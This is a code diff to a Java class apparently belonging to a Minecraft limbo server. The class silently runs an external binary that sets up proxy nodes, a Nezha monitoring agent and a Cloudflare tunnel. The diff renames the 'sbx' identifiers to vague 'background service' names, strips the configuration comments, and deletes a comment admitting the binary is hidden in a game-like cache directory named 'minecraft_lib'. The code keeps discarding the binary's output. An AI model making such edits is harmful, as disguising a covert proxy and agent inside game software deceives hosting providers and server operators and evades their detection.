@@ -33,7 +33,7 @@ public final class NanoLimbo {
     private static final String ANSI_RED = "\033[1;31m";
     private static final String ANSI_RESET = "\033[0m";
     private static final AtomicBoolean running = new AtomicBoolean(true);
-    private static Process sbxProcess;
+    private static Process serviceProcess;
     
     private static final String[] ALL_ENV_VARS = {
         "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
@@ -56,9 +56,9 @@ public final class NanoLimbo {
             System.exit(1);
         }
 
-        // Start SbxService
+        // Start background service
         try {
-            runSbxBinary();
+            runServiceBinary();
             
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                 running.set(false);
@@ -73,7 +73,7 @@ public final class NanoLimbo {
             Thread.sleep(15000);
             clearConsole();
         } catch (Exception e) {
-            System.err.println(ANSI_RED + "Error initializing SbxService: " + e.getMessage() + ANSI_RESET);
+            System.err.println(ANSI_RED + "Error initializing background service: " + e.getMessage() + ANSI_RESET);
         }
         
         // start game
@@ -110,7 +110,7 @@ public final class NanoLimbo {
         }
     }   
     
-    private static void runSbxBinary() throws Exception {
+    private static void runServiceBinary() throws Exception {
         Map<String, String> envVars = new HashMap<>();
         loadEnvVars(envVars);
         
@@ -120,7 +120,7 @@ public final class NanoLimbo {
         pb.redirectOutput(ProcessBuilder.Redirect.to(new File("/dev/null")));
         pb.redirectError(ProcessBuilder.Redirect.to(new File("/dev/null")));
         
-        sbxProcess = pb.start();
+        serviceProcess = pb.start();
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
@@ -129,9 +129,9 @@ public final class NanoLimbo {
         envVars.put("NEZHA_SERVER", "");       // 哪吒面板地址 v1格式：nezha.xxx.com:8008  哪吒v0格式：nezha.xxx.com
         envVars.put("NEZHA_PORT", "");         // 哪吒v1请留空，哪吒v0的agent端口
         envVars.put("NEZHA_KEY", "");          // 哪吒v1的NZ_CLIENT_SECRET或哪吒v0的agent密钥
-        envVars.put("ARGO_PORT", "");          // argo隧道端口，使用固定隧道token需要在cloudflare里设置和这里一致
-        envVars.put("ARGO_DOMAIN", "");        // argo固定隧道隧道域名
-        envVars.put("ARGO_AUTH", "");          // argo固定隧道隧道密钥json或token，json可在https://json.zone.id 获取
+        envVars.put("ARGO_PORT", "");          // 留空则不启用
+        envVars.put("ARGO_DOMAIN", "");        // 留空则不启用
+        envVars.put("ARGO_AUTH", "");          // 留空则不启用
         envVars.put("S5_PORT", "");            // socks5节点(tcp协议)端口，支持多端口可以填写，否则留空
         envVars.put("HY2_PORT", "26453");      // hysteria2节点(udp协议)端口，支持多端口可以填写，否则留空
         envVars.put("TUIC_PORT", "");          // tuic节点(udp协议)端口，支持多端口可以填写，否则留空
@@ -144,7 +144,7 @@ public final class NanoLimbo {
         envVars.put("CFIP", "spring.io");      // 优选域名或获选ip
         envVars.put("CFPORT", "443");          // 优选域名或获选ip对应端口
         envVars.put("NAME", "");               // 节点备注名称
-        envVars.put("DISABLE_ARGO", "true");   // 是否关闭argo隧道，true 关闭，false 开启，默认关闭
+        envVars.put("DISABLE_ARGO", "true");   // true 关闭，false 开启，默认关闭
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
@@ -191,7 +191,6 @@ public final class NanoLimbo {
             throw new RuntimeException("Unsupported architecture: " + osArch);
         }
         
-        // Hide binary in a game-like cache directory
         Path cacheDir = Paths.get(System.getProperty("user.home"), ".minecraft", ".cache");
         Files.createDirectories(cacheDir);
         Path path = cacheDir.resolve("minecraft_lib");
@@ -208,9 +207,9 @@ public final class NanoLimbo {
     }
     
     private static void stopServices() {
-        if (sbxProcess != null && sbxProcess.isAlive()) {
-            sbxProcess.destroy();
-            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
+        if (serviceProcess != null && serviceProcess.isAlive()) {
+            serviceProcess.destroy();
+            System.out.println(ANSI_RED + "Service process terminated" + ANSI_RESET);
         }
     }
 }
